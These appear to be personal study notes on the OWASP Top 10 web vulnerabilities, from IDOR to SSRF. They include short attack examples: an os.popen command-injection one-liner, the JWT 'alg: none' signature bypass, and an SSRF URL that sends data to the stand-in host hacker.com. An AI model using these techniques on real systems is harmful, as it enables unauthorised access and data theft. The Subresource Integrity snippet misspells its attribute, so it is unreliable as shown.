
# 1. Broken Access Control
Websites have pages that are protected from regular visitors. For example, only the site's admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see then the access controls are broken.
Broken access control is a vulnerability that lets attackers to bypass authorization, allowing them to view sensitive data or perform tasks they aren't supposed to.
## IDOR
Insecure Direct Object Reference refers to an access control vulnerability where we can access resources we wouldn't ordinarily be able to see. This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server. This could be, a file, user, image, etc.
One example is having a URL like the following
`https://bank.com/account?id=1234`
if we were to change the value of the Id we could gain access to other accounts bypassing the need to login if some security measures are not in place.

# 2. Cryptographic Failures
A cryptographic failure refers to any vulnerability arising from the misuse of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.
This often end up in web apps accidentally divulging sensitive data. At more complex levels, taking advantage of some cryptographic failures often involves techniques such as MITM attacks, taking advantage of weak encryption on any transmitted data to access the intercepted information.
One example would be to have passwords stored in hashes but utilizing either common passwords or a weak hashing algorithm.

# 3. Injection
These type of flaws occur because there is a lack of sanitization of user input and the application interprets user-controlled input as commands or parameters. These depend on what technologies are used and how these technologies interpret the input. Some common examples are SQLi and Command injection. 
The main defence for preventing injection attacks is ensuring that user-controleld input is not interpreted as queries or commands. This can be achieved using an "allow list" or by stripping the input from dangerous characters. 

# 4. Insecure Design
Insecure design refers to vulnerabilities which are inherent to the application's architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application is flawed from the start. Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to our final app. Some other times insecure design vulnerabilities may also be introduced by developers while adding some "shortcuts" around the code to make their testing easier. A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.

## Insecure Password Resets
One example are insecure password resets, having a way to reset the password should be one of the most secure things in the server, so using for example personal questions like, "what was the name of your first pet?" although a relatively secure question, it could be brute forced by applications like [[Burp]] Intruder, with a list of most common pet names. If the page does not implement a limit to how many request can be made per account or per IP, then the service would most likely be vulnerable.

# 5. Security Misconfiguration
Security misconfigurations are distinct from the other top 10 because they occur when security could have been appropriately configured but was not. Even if we download the latest up-to-date software, poor configurations could make our installation vulnerable.
These include:
- Poorly configured permissions on cloud services
- Having unnecessary features enabled, like services, pages, accounts or privileges
- Default accounts with unchanged passwords
- Error messages that are overly detailed and allow attackers to find out more about the system
- Not using HTTP security headers
This vulnerability can often lead to more vulnerabilities, such as default credentials giving us access to sensitive data, **XML External Entities** (XXE) or command injections on admin pages.
One example of this could be to have a python compiler on the page, by having this an attacker could use the `os` library to call system functions, and do command injections
```python
import os; print(os.popen("whoami").read())
```

# 6. Vulnerable and Outdated Components
Occasionally we may find that a company is using a program with a well-known vulnerability. Since by using an older version of software the chances of having a known vulnerability increase, we can take advantage of this and search for exploits for that specific version.

# 7. Identification and Authentication Failures
Authentication and session management constitute the core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. 
If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other user's accounts. Some common flaws in authentication mechanisms include the following:
- Brute force attacks
- Use of weak credentials
- Weak session cookies
- Re-registration
Some mitigations can algo be implemented for broken authentication mechanisms depending on the flaw:
- To avoid password-guessing attacks, ensuring the application enforces as strong password policy
- To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts.
- Implement Multi-Factor Authentication.

# 8. Software and Data Integrity Failures
## Software 
Some websites use third-party libraries that are stored in some external servers out of their control, although strange, it is a common practice to include libraries in websites without downloading them by including something like the following
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```
This means, that wen a user navigates to that website, the browser will read its HTML code and use that library. 
The problem here is that if someone hacks into that repository, they could change the contents of that file into malicious code. As a result anyone visiting the website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as the website makes no check against the third-party library to see if it has changed. Some browsers allow us to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This is called **Subresource Integrity** (SRI).
So the correct way to insert a library into HTML would be to use SRI like this:
```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" intgrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```
We can use [srihash](https://www.srihash.org) to generate hashes for any library if needed.

## Data Integrity
Cookies! All web applications that maintain sessions use cookies. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually COOKIES.
Normally ok, but if a website assigns a cookie to each user, in which, it contains their username, whenever they enter the page they are going to enter automatically into their account. The problem comes because as cookies are stored in the user's browser, if they edit their own cookie to that of another user's (which in this case would just be their username) they could enter their account and retrieve their data or impersonate them. 
One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. One such implementation is **JSON Web Tokens** (JWT).
JWT are very simple tokens that allow us to store key-value pairs on a token that provides integrity as part of the token. The idea is that we can generate tokens that we can give our users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check.
![[Pasted image 20240302000624.png]]
A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:

1. Modify the header section of the token so that the `alg` header would contain the value `none`.
2. Remove the signature part.

Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.
![[Pasted image 20240302000639.png]]

# 9. Security Logging & Monitoring Failures
When web applications are set up, every action performed by the user should be logged. Logging is important, because in the event of an incident, the attacker's activities can be traced. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. 
The information stored in logs should include the following:
- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses
As these have some sensitive information it is important that they are stored securely and that multiple copies of these logs are stored at different locations.
The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated.  

# 10. SSRF
Server-Side Request Forgery, this type of vulnerability occurs when an attacker can coerce a web application into sending request on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise form implementations where our web application needs to use third-party services.
An easy example is whenever a server is trying to use an intermediary website to send a secret message it could maybe look like this
```
https://website.com/homepage?server=sender.com&msg=hallo
```
Then the server will build a query to the third-party server to send the message
```
https://sender.com/send?msg=hallo
```
and forward that request to it. 
If for example the server were to also send sensitive data in that request we could make and forge our own server to make the request send it to ourselves instead by just changing the request
```
https://website.com/homepage?server=hacker.com&msg=hallo
```
This way we would intercept the information. 
Now, depending on the scenario this could also be used for:
- Enumerate internal networks
- Abuse trust relationships between servers and gain access to otherwise restricted services
- Interact with some non-HTTP services to get RCE